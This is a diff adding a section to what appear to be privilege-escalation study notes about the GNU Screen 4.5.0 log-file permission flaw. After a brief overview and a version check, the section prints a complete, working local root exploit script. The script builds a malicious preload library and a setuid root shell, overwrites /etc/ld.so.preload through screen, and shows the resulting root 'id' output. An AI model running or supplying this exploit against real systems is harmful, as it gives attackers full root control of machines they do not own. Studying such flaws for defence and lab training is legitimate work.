@@ -1256,3 +1256,106 @@ su
 
 ---
 
+# Vulnerable Services – GNU Screen 4.5.0 Exploit
+
+## Overview
+- Many services may contain flaws that can be exploited for **privilege escalation**.  
+- **GNU Screen v4.5.0** suffers from a vulnerability due to **missing permissions check** when opening a log file.  
+- This flaw allows an attacker to:
+  - Truncate **any file**.
+  - Create a file owned by **root** in any directory.
+  - Ultimately gain **full root access**.
+
+## Identifying Vulnerable Screen Version
+```bash
+screen -v
+````
+
+**Output:**
+
+```
+Screen version 4.05.00 (GNU) 10-Dec-16
+```
+
+* Confirms the system is running the **vulnerable version**.
+
+## Exploitation Workflow
+
+### 1. Run Exploit Script
+
+```bash
+./screen_exploit.sh
+```
+
+### 2. Verify Root Access
+
+```bash
+id
+```
+
+**Output:**
+
+```
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),
+46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)
+```
+
+* Successfully escalated privileges to **root**.
+
+## Proof-of-Concept Exploit Script
+
+```bash
+#!/bin/bash
+# screenroot.sh
+# setuid screen v4.5.0 local root exploit
+# abuses ld.so.preload overwriting to get root.
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
+# HACK THE PLANET
+# ~ infodox (25/1/2017)
+
+echo "~ gnu/screenroot ~"
+echo "[+] First, we create our shell and library..."
+
+# Malicious shared library
+cat << EOF > /tmp/libhax.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/stat.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+
+# Root shell binary
+cat << EOF > /tmp/rootshell.c
+#include <stdio.h>
+int main(void){
+    setuid(0); setgid(0);
+    seteuid(0); setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
+rm -f /tmp/rootshell.c
+
+# Abuse screen to overwrite /etc/ld.so.preload
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /etc
+umask 000 # set permissions wide open
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline required
+
+# Trigger payload
+echo "[+] Triggering..."
+screen -ls # loads the malicious library via setuid root
+/tmp/rootshell
+```
+
+---
+
